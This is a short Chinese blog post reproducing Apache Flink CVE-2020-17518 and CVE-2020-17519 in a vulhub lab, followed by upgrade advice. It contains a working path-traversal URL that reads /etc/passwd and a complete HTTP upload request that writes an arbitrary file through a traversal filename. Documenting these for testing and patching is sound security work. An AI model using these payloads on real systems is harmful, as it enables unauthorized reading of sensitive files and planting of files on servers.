**目录**

[漏洞描述](#t0 "漏洞描述")

[漏洞影响版本](#t1 "漏洞影响版本")

[漏洞复现](#t2 "漏洞复现")

[任意文件读取](#t3 "任意文件读取")

[任意文件写入](#t4 "任意文件写入")

[修复建议](#t5 "修复建议")

* * *

漏洞描述
----

     Flink 在 1.5.1 版本中引入了一个 REST [handler](https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020)，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。

   [Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Flink 1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)允许攻击者通过JobManager进程的REST接口使用 ../../ 进行目录遍历以实现系统任意文件读取。

漏洞影响版本
------

| **漏洞编号** | **影响版本** | **漏洞类型** |
| --- | --- | --- |
| CVE-2020-17518 | Apache Flink 1.5.1 ~ 1.11.2 | 文件写入 |
| CVE-2020-17519 | Apache Flink 1.11.0 ~ 1.11.2 | 任意文件读取 |

漏洞复现
----

环境搭建：[vulhub/docker-compose.yml at master · vulhub/vulhub · GitHub](https://github.com/vulhub/vulhub/blob/master/flink/CVE-2020-17518/docker-compose.yml "vulhub/docker-compose.yml at master · vulhub/vulhub · GitHub")

### 任意文件读取

payload

```
http://xx.xx.xx.xx:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```


![](https://img-blog.csdnimg.cn/20210114153727681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 任意文件写入

http数据包

```
POST /jars/upload HTTP/1.1      
Host: xx.xx.xx.xx:8081      
Accept-Encoding: gzip, deflate      
Accept: */*      
Accept-Language: en      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36      
Connection: close      
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y      
Content-Length: 185      1
​      1
------WebKitFormBoundaryoZ8meKnrrso89R6Y      1
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"      1
​      1
success      1
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```


![](https://img-blog.csdnimg.cn/20210114153745911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

修复建议
----

请及时升级至Flink 1.11.3或Flink 1.12.0。下载链接：[https://flink.apache.org/zh/downloads.html](https://flink.apache.org/zh/downloads.html "https://flink.apache.org/zh/downloads.html")

参考文章：[vulhub/flink at master · vulhub/vulhub · GitHub](https://github.com/vulhub/vulhub/tree/master/flink "vulhub/flink at master · vulhub/vulhub · GitHub")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)